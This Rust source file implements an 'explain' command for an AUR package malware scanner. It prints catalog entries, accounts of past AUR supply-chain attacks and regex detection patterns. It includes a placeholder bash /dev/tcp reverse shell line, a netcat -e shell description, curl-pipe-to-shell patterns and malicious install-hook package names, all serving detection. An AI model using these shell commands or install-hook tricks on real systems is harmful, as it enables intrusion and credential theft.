//! Explain a detection code in detail (sourced from the authoritative catalog).

use anyhow::{bail, Result};
use aur_scanner_core::catalog::{Catalog, CatalogEntry};
use aur_scanner_core::Severity;
use colored::Colorize;

pub fn run(code: &str) -> Result<()> {
    let catalog = Catalog::load();
    let want = code.to_uppercase();

    if let Some(e) = catalog.get(&want) {
        print_detailed_explanation(e);
        return Ok(());
    }

    let matches: Vec<&CatalogEntry> = catalog
        .entries
        .iter()
        .filter(|e| e.id.to_uppercase().contains(&want) || e.name.to_uppercase().contains(&want))
        .collect();

    match matches.len() {
        0 => {
            println!("{}", format!("Unknown code: {}", code).red());
            println!();
            println!("Use 'aur-scan codes' to list all available detection codes.");
            bail!("Unknown detection code");
        }
        1 => {
            print_detailed_explanation(matches[0]);
            Ok(())
        }
        _ => {
            println!("{}", format!("Multiple matches for '{}':", code).yellow());
            println!();
            for m in matches {
                println!("  {} - {}", m.id.green(), m.name);
            }
            println!();
            println!("Please specify the exact code.");
            Ok(())
        }
    }
}

fn print_detailed_explanation(entry: &CatalogEntry) {
    let sev = entry.severity.to_string();
    let severity_colored = match entry.severity {
        Severity::Critical => sev.red().bold(),
        Severity::High => sev.yellow().bold(),
        Severity::Medium => sev.blue().bold(),
        Severity::Low => sev.white().bold(),
        Severity::Info => sev.normal(),
    };

    println!();
    println!("{}", "=".repeat(70));
    println!(
        "{} {} [{}]",
        entry.id.green().bold(),
        entry.name.white().bold(),
        severity_colored
    );
    println!("{}", "=".repeat(70));
    println!();

    println!("{}", "Category:".cyan().bold());
    println!("  {}  (detector: {})", entry.category, entry.owner.dimmed());
    println!();

    println!("{}", "Description:".cyan().bold());
    for line in textwrap(&entry.description, 66) {
        println!("  {}", line);
    }
    println!();

    println!("{}", "Recommendation:".cyan().bold());
    for line in textwrap(&entry.recommendation, 66) {
        println!("  {}", line);
    }
    println!();

    if let Some(cwe) = &entry.cwe {
        println!("{} {}", "CWE:".cyan().bold(), cwe.dimmed());
        println!();
    }

    // Add real-world context for notable codes
    if let Some(context) = get_real_world_context(&entry.id) {
        println!("{}", "Real-World Context:".cyan().bold());
        for line in textwrap(&context, 66) {
            println!("  {}", line);
        }
        println!();
    }

    // Add technical details
    if let Some(tech) = get_technical_details(&entry.id) {
        println!("{}", "Technical Details:".cyan().bold());
        for line in textwrap(&tech, 66) {
            println!("  {}", line);
        }
        println!();
    }

    // Add detection patterns
    if let Some(patterns) = get_detection_patterns(&entry.id) {
        println!("{}", "Detection Patterns:".cyan().bold());
        for pattern in patterns {
            println!("  - {}", pattern.dimmed());
        }
        println!();
    }

    // Add related codes
    if let Some(related) = get_related_codes(&entry.id) {
        println!("{}", "Related Codes:".cyan().bold());
        println!("  {}", related.join(", "));
        println!();
    }

    println!("{}", "=".repeat(70));
}

fn textwrap(text: &str, width: usize) -> Vec<String> {
    let mut lines = Vec::new();
    let mut current_line = String::new();

    for word in text.split_whitespace() {
        if current_line.len() + word.len() + 1 > width && !current_line.is_empty() {
            lines.push(current_line);
            current_line = String::new();
        }
        if !current_line.is_empty() {
            current_line.push(' ');
        }
        current_line.push_str(word);
    }

    if !current_line.is_empty() {
        lines.push(current_line);
    }

    lines
}

fn get_real_world_context(code: &str) -> Option<String> {
    match code {
        "DLE-001" | "DLE-002" => Some(
            "Used in the July 2018 'xeactor' attack where orphaned AUR packages \
             (acroread, balz, minergate) were taken over and modified to download \
             malicious scripts from ptpb.pw using curl."
                .to_string(),
        ),
        "PASTE-001" => Some(
            "The 2018 xeactor attacker used ptpb.pw (a pastebin clone) to host \
             malicious scripts. The scripts ~x and ~u were downloaded and \
             executed, creating systemd timers for persistence."
                .to_string(),
        ),
        "PERSIST-001" | "PERSIST-002" => Some(
            "Systemd persistence was used in both the 2018 xeactor attack \
             (timers running every 360 seconds) and the July 2025 CHAOS RAT \
             attack (services running at boot as default.target dependency)."
                .to_string(),
        ),
        "PERSIST-006" => Some(
            "The July 2025 CHAOS RAT attack used a binary named 'systemd-initd' \
             to masquerade as a legitimate systemd component. It was placed in \
             /usr/local/share or /tmp and executed via systemd service."
                .to_string(),
        ),
        "INSTALL-001" => Some(
            "The July 2025 CHAOS RAT packages (librewolf-fix-bin, firefox-patch-bin, \
             zen-browser-patched-bin) executed Python scripts in post_install hooks \
             that downloaded and installed the RAT payload."
                .to_string(),
        ),
        "META-001" => Some(
            "CHAOS RAT packages abused the 'provides' field to appear as \
             alternatives to legitimate packages (firefox-fix, etc.), tricking \
             users into installing them as dependencies."
                .to_string(),
        ),
        "ATOMIC-001" | "ATOMIC-002" | "ATOMIC-003" => Some(
            "The June 2026 'Atomic Arch' campaign adopted hundreds of orphaned AUR \
             packages (alvr, premake-git, and 1,500+ others) and modified their \
             PKGBUILD/install hooks to run `npm install atomic-lockfile` (wave 1) or \
             `bun install js-digest` (wave 2). The payload is a credential stealer \
             with an optional root-only eBPF rootkit (scales.bpf.c). The hijacked \
             packages themselves looked clean, so signature scanners missed them."
                .to_string(),
        ),
        _ => None,
    }
}

fn get_technical_details(code: &str) -> Option<String> {
    match code {
        "SHELL-001" => Some(
            "Bash's /dev/tcp is a pseudo-device that creates TCP connections. \
             Pattern: bash -i >& /dev/tcp/IP/PORT 0>&1 redirects stdin/stdout/stderr \
             to the attacker's listener."
                .to_string(),
        ),
        "SHELL-002" => Some(
            "Netcat's -e flag executes a program (usually /bin/sh) and connects \
             its stdin/stdout to the network socket. Some versions use -c instead."
                .to_string(),
        ),
        "ENV-001" => Some(
            "LD_PRELOAD loads shared libraries before all others, allowing \
             function hooking. Attackers use this to intercept system calls \
             or inject code into processes."
                .to_string(),
        ),
        "CRYPTO-001" => Some(
            "Mining pools use the stratum protocol (stratum+tcp://) for work \
             distribution. Presence of pool URLs indicates unauthorized mining."
                .to_string(),
        ),
        "OBF-001" => Some(
            "Base64 encoding is commonly used to hide malicious payloads from \
             simple pattern matching. Decode with: echo 'payload' | base64 -d"
                .to_string(),
        ),
        "ATOMIC-002" => Some(
            "The hijacked PKGBUILDs added an install hook (post_install/post_upgrade) \
             that shells out to a JS package manager: `npm install atomic-lockfile` or \
             `bun install js-digest`. The malicious npm package runs a `preinstall` \
             lifecycle script that drops a bundled ELF, which loads scales.bpf.c via \
             eBPF for rootkit-like hiding."
                .to_string(),
        ),
        _ => None,
    }
}

fn get_detection_patterns(code: &str) -> Option<Vec<&'static str>> {
    match code {
        "DLE-001" => Some(vec![
            r"curl\s+[^|]+\|\s*(ba)?sh",
            r"curl .* \| sh",
            r"curl .* \| bash",
        ]),
        "SHELL-001" => Some(vec![r"/dev/tcp/\d+\.\d+\.\d+\.\d+/\d+"]),
        "PERSIST-001" => Some(vec![
            r"systemctl\s+(enable|start|daemon-reload)",
            r"/etc/systemd/system/",
            r"~/.config/systemd/user/",
        ]),
        "PASTE-001" => Some(vec![
            r"pastebin\.com",
            r"paste\.ee",
            r"ptpb\.pw",
            r"ix\.io",
            r"hastebin",
        ]),
        "ATOMIC-001" => Some(vec![r"\b(atomic-lockfile|js-digest|lockfile-js)\b"]),
        "ATOMIC-002" => Some(vec![
            r"\b(npm|pnpm|yarn)\s+(install|add|i)\b",
            r"\bbunx?\s+(install|add|i|x)\b",
        ]),
        "ATOMIC-003" => Some(vec![r"scales\.bpf\.c", r"src/hooks/deps\b"]),
        _ => None,
    }
}

fn get_related_codes(code: &str) -> Option<Vec<&'static str>> {
    match code {
        "DLE-001" => Some(vec!["DLE-002", "DLE-003", "PASTE-001"]),
        "DLE-002" => Some(vec!["DLE-001", "DLE-003", "PASTE-001"]),
        "SHELL-001" => Some(vec!["SHELL-002", "SHELL-003", "SHELL-004"]),
        "PERSIST-001" => Some(vec![
            "PERSIST-002",
            "PERSIST-003",
            "PERSIST-004",
            "PERSIST-006",
        ]),
        "CRED-001" => Some(vec!["CRED-002", "CRED-003", "BROWSER-001", "BROWSER-002"]),
        "INSTALL-001" => Some(vec!["INSTALL-002", "INSTALL-003", "PERSIST-001"]),
        "OBF-001" => Some(vec!["OBF-002", "OBF-003", "OBF-005"]),
        "ATOMIC-001" => Some(vec!["ATOMIC-002", "ATOMIC-003", "INSTALL-003"]),
        "ATOMIC-002" => Some(vec!["ATOMIC-001", "ATOMIC-003", "INSTALL-003"]),
        "ATOMIC-003" => Some(vec!["ATOMIC-001", "ATOMIC-002", "PERSIST-006"]),
        _ => None,
    }
}
